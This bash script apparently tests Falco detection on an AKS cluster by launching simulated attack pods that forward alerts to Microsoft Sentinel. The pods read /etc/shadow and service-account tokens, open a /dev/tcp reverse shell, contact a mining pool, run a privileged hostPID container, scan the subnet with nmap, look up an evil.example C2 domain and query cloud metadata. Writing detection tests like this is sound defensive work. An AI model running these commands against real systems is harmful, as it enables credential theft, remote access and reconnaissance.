#!/bin/bash
# ============================================================
# Rogue Actor Simulation — Trigger Falco Security Alerts on AKS
# ============================================================
# Runs a series of attack scenarios inside the cluster so that
# Falco detects and forwards alerts to Microsoft Sentinel via
# the Logic App webhook.
#
# Usage:
#   ./simulate-attacks.sh [OPTIONS]
#
# Options:
#   --namespace <ns>    Namespace to run attack pods in (default: falco-demo-attacks)
#   --all               Run all scenarios (default)
#   --scenario <name>   Run a single scenario:
#                         sensitive-file | package-mgmt | crypto-miner |
#                         reverse-shell | k8s-secrets | privileged-container |
#                         lateral-movement
#   --cleanup           Delete the attack namespace when done
#   -h, --help          Show this help
#
# Prerequisites: kubectl configured for the target cluster
# ============================================================

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()   { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[ERROR]${NC} $1"; }
title() { echo -e "\n${CYAN}========================================${NC}"; echo -e "${CYAN}  $1${NC}"; echo -e "${CYAN}========================================${NC}"; }

# ---- defaults ----------------------------------------------------------------
ATTACK_NS="falco-demo-attacks"
SCENARIO="all"
CLEANUP=false

# ---- arg parse ---------------------------------------------------------------
while [[ $# -gt 0 ]]; do
  case $1 in
    --namespace) ATTACK_NS="$2"; shift 2 ;;
    --all)       SCENARIO="all"; shift ;;
    --scenario)  SCENARIO="$2"; shift 2 ;;
    --cleanup)   CLEANUP=true; shift ;;
    -h|--help)
      sed -n '/^# Usage:/,/^# ====/p' "$0" | head -n -1 | sed 's/^# \{0,2\}//'
      exit 0 ;;
    *) err "Unknown option: $1"; exit 1 ;;
  esac
done

# ---- preflight ---------------------------------------------------------------
check_prereqs() {
  if ! command -v kubectl &>/dev/null; then
    err "kubectl not found — run from a machine with cluster access"; exit 1
  fi
  if ! kubectl cluster-info &>/dev/null 2>&1; then
    err "kubectl cannot reach the cluster — check your kubeconfig"; exit 1
  fi
  log "Cluster reachable: $(kubectl config current-context)"
}

# ---- namespace ---------------------------------------------------------------
setup_namespace() {
  if ! kubectl get namespace "$ATTACK_NS" &>/dev/null 2>&1; then
    log "Creating attack namespace: $ATTACK_NS"
    kubectl create namespace "$ATTACK_NS"
    kubectl label namespace "$ATTACK_NS" purpose=falco-demo --overwrite
  else
    warn "Namespace '$ATTACK_NS' already exists — reusing"
  fi
}

# ---- helper: run ephemeral attack pod ----------------------------------------
# run_attack <pod-name> <image> <command>
run_attack() {
  local pod_name="$1"
  local image="$2"
  shift 2
  local cmd=("$@")

  log "Launching attack pod: $pod_name"
  kubectl run "$pod_name" \
    --image="$image" \
    --namespace="$ATTACK_NS" \
    --restart=Never \
    --command -- "${cmd[@]}" 2>/dev/null || true

  # wait max 30s for the pod to complete/error
  kubectl wait pod/"$pod_name" \
    --namespace="$ATTACK_NS" \
    --for=condition=Ready \
    --timeout=20s 2>/dev/null || true

  # show tail of logs
  kubectl logs "$pod_name" --namespace="$ATTACK_NS" 2>/dev/null | tail -5 || true
  kubectl delete pod "$pod_name" --namespace="$ATTACK_NS" --ignore-not-found &>/dev/null &
}

# ---- helper: apply a manifest then delete it ---------------------------------
apply_then_delete() {
  local name="$1"
  local manifest="$2"
  log "Applying: $name"
  echo "$manifest" | kubectl apply -f - 2>/dev/null || true
  echo "Waiting 15s for detection..."
  sleep 15
  echo "$manifest" | kubectl delete -f - --ignore-not-found 2>/dev/null || true
}

# ==============================================================================
# SCENARIO 1 — Sensitive file read
# Falco rule: "Read sensitive file untrusted"
# ==============================================================================
scenario_sensitive_file() {
  title "SCENARIO 1: Sensitive File Access"
  log "Reading /etc/shadow and /etc/passwd from inside a container"

  apply_then_delete "sensitive-file-pod" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-sensitive-file
  namespace: falco-demo-attacks
  labels:
    scenario: sensitive-file
spec:
  restartPolicy: Never
  containers:
  - name: attacker
    image: alpine:3.19
    command:
    - sh
    - -c
    - |
      echo "[+] Reading /etc/shadow..."
      cat /etc/shadow 2>/dev/null || echo "(empty)"
      echo "[+] Reading /etc/passwd..."
      cat /etc/passwd
      echo "[+] Reading /root/.ssh/authorized_keys..."
      cat /root/.ssh/authorized_keys 2>/dev/null || echo "(no keys)"
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 2 — Package management in container
# Falco rule: "Launch Package Management Process in Container"
# ==============================================================================
scenario_package_mgmt() {
  title "SCENARIO 2: Package Management in Container"
  log "Running apk/apt-get inside a running container (typical supply-chain IOC)"

  apply_then_delete "rogue-pkg-mgmt" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-pkg-mgmt
  namespace: falco-demo-attacks
  labels:
    scenario: package-mgmt
spec:
  restartPolicy: Never
  containers:
  - name: attacker
    image: alpine:3.19
    command:
    - sh
    - -c
    - |
      echo "[+] Installing packages (simulated C2 tool install)..."
      apk update 2>&1 | tail -3
      apk add --no-cache curl wget nmap 2>&1 | tail -5
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 3 — Crypto miner simulation
# Falco rule: "Detect crypto miners using the Stratum protocol" /
#             "Unexpected outbound connection destination"
# ==============================================================================
scenario_crypto_miner() {
  title "SCENARIO 3: Crypto Miner Simulation"
  log "Connecting to a Stratum mining pool endpoint (no actual mining)"

  apply_then_delete "rogue-crypto-miner" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-crypto-miner
  namespace: falco-demo-attacks
  labels:
    scenario: crypto-miner
spec:
  restartPolicy: Never
  containers:
  - name: attacker
    image: alpine:3.19
    command:
    - sh
    - -c
    - |
      apk add --no-cache netcat-openbsd 2>/dev/null
      echo "[+] Simulating Stratum protocol connection to mining pool..."
      echo '{"id":1,"method":"mining.subscribe","params":[]}' | \
        nc -w 3 pool.minexmr.com 3333 2>/dev/null || echo "(connection blocked — Falco/NetworkPolicy may have caught it)"
      echo "[+] Simulating curl to known miner binary host..."
      curl -s --max-time 5 http://xmrig.com/download 2>/dev/null | head -1 || true
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 4 — Reverse shell simulation
# Falco rule: "Reverse shell" / "Detect shell spawned in container"
# ==============================================================================
scenario_reverse_shell() {
  title "SCENARIO 4: Reverse Shell Simulation"
  log "Spawning a shell via /dev/tcp and writing shell history"

  apply_then_delete "rogue-reverse-shell" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-reverse-shell
  namespace: falco-demo-attacks
  labels:
    scenario: reverse-shell
spec:
  restartPolicy: Never
  containers:
  - name: attacker
    image: ubuntu:22.04
    command:
    - bash
    - -c
    - |
      echo "[+] Writing suspicious shell history..."
      echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /root/.bash_history
      echo "[+] Attempting bash reverse shell (will fail — no listener, triggers Falco)..."
      bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' 2>/dev/null || true
      echo "[+] Spawning interactive shell via script..."
      script -q -c "echo rogue_shell_spawned" /dev/null
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 5 — Kubernetes secrets access
# Falco rule: "Read Kubernetes Secret from container"
# ==============================================================================
scenario_k8s_secrets() {
  title "SCENARIO 5: Kubernetes Secret Access"
  log "Reading service account tokens and projected secrets from within a pod"

  apply_then_delete "rogue-k8s-secrets" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-k8s-secrets
  namespace: falco-demo-attacks
  labels:
    scenario: k8s-secrets
spec:
  restartPolicy: Never
  serviceAccountName: default
  containers:
  - name: attacker
    image: alpine:3.19
    command:
    - sh
    - -c
    - |
      echo "[+] Reading default service account token..."
      cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40
      echo "..."
      echo "[+] Reading CA cert..."
      cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | head -3
      echo "[+] Calling Kubernetes API with service account token..."
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      APISERVER="https://kubernetes.default.svc"
      curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H "Authorization: Bearer $TOKEN" \
        "$APISERVER/api/v1/secrets" 2>/dev/null | head -5 || true
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 6 — Privileged container
# Falco rule: "Launch Privileged Container"
# ==============================================================================
scenario_privileged_container() {
  title "SCENARIO 6: Privileged Container Launch"
  log "Starting a privileged container with host PID access"

  apply_then_delete "rogue-privileged" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-privileged
  namespace: falco-demo-attacks
  labels:
    scenario: privileged
spec:
  restartPolicy: Never
  hostPID: true
  containers:
  - name: attacker
    image: alpine:3.19
    securityContext:
      privileged: true
    command:
    - sh
    - -c
    - |
      echo "[+] Running as privileged container with hostPID..."
      id
      echo "[+] Listing host processes (via /proc)..."
      ls /proc | grep -E '^[0-9]+$' | head -20
      echo "[+] Writing to /proc/sys (host kernel parameter)..."
      cat /proc/sys/kernel/hostname 2>/dev/null || true
      echo "[+] Checking for container escape via /dev..."
      ls /dev/sd* /dev/nvme* 2>/dev/null || echo "(no block devices visible)"
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# SCENARIO 7 — Lateral movement (network scan simulation)
# Falco rule: "Unexpected outbound connection" / "Network tool launched in container"
# ==============================================================================
scenario_lateral_movement() {
  title "SCENARIO 7: Lateral Movement / Network Reconnaissance"
  log "Running nmap and wget inside a container to simulate C2 callback and scanning"

  apply_then_delete "rogue-lateral" "$(cat <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: rogue-lateral-movement
  namespace: falco-demo-attacks
  labels:
    scenario: lateral-movement
spec:
  restartPolicy: Never
  containers:
  - name: attacker
    image: alpine:3.19
    command:
    - sh
    - -c
    - |
      apk add --no-cache nmap curl 2>/dev/null
      echo "[+] Scanning internal subnet (cluster CIDR recon)..."
      nmap -T4 -F 10.0.0.1/28 2>/dev/null | tail -10 || true
      echo "[+] Attempting DNS exfiltration simulation..."
      nslookup attacker-c2.evil.example.com 2>/dev/null || true
      echo "[+] Simulating C2 beacon callback..."
      curl -s --max-time 5 http://169.254.169.254/metadata/instance 2>/dev/null | head -3 || true
      echo "[DONE]"
EOF
)"
}

# ==============================================================================
# Cleanup
# ==============================================================================
do_cleanup() {
  title "Cleanup"
  log "Deleting attack namespace: $ATTACK_NS"
  kubectl delete namespace "$ATTACK_NS" --ignore-not-found
  log "Done."
}

# ==============================================================================
# Summary
# ==============================================================================
print_summary() {
  title "Simulation Complete"
  cat <<EOF
All attack scenarios have been executed. Allow 2-5 minutes for:
  1. Falco to detect and forward alerts to falcosidekick
  2. falcosidekick to POST to the Logic App webhook
  3. Logic App to write to FalcoLogs_CL in Log Analytics
  4. Sentinel analytics rules to fire and create Incidents

Next steps:
  # Check Falco detections in real-time:
  kubectl logs -n falco -l app.kubernetes.io/name=falco -f --tail=50

  # Check falcosidekick webhook forwarding:
  kubectl logs -n falco -l app.kubernetes.io/name=falcosidekick -f --tail=20

  # Query Log Analytics for ingested Falco alerts:
  WS_ID=\$(az monitor log-analytics workspace show \\
    -g rg-falco-demo -n falcosec-law --query customerId -o tsv)
  az monitor log-analytics query -w "\$WS_ID" \\
    --analytics-query "FalcoLogs_CL | order by TimeGenerated desc | take 20" \\
    -o table

  # Open Sentinel Incidents:
  https://portal.azure.com/#view/Microsoft_Azure_Security_Insights/MainMenuBlade/~/Incidents

EOF
}

# ==============================================================================
# Main
# ==============================================================================
main() {
  check_prereqs
  setup_namespace

  case "$SCENARIO" in
    all)
      scenario_sensitive_file
      scenario_package_mgmt
      scenario_crypto_miner
      scenario_reverse_shell
      scenario_k8s_secrets
      scenario_privileged_container
      scenario_lateral_movement
      ;;
    sensitive-file)       scenario_sensitive_file ;;
    package-mgmt)         scenario_package_mgmt ;;
    crypto-miner)         scenario_crypto_miner ;;
    reverse-shell)        scenario_reverse_shell ;;
    k8s-secrets)          scenario_k8s_secrets ;;
    privileged-container) scenario_privileged_container ;;
    lateral-movement)     scenario_lateral_movement ;;
    *)
      err "Unknown scenario: $SCENARIO"
      err "Valid values: sensitive-file | package-mgmt | crypto-miner | reverse-shell | k8s-secrets | privileged-container | lateral-movement"
      exit 1
      ;;
  esac

  print_summary

  if $CLEANUP; then
    do_cleanup
  else
    warn "Attack namespace '$ATTACK_NS' left in place. Run with --cleanup or:"
    warn "  kubectl delete namespace $ATTACK_NS"
  fi
}

main "$@"
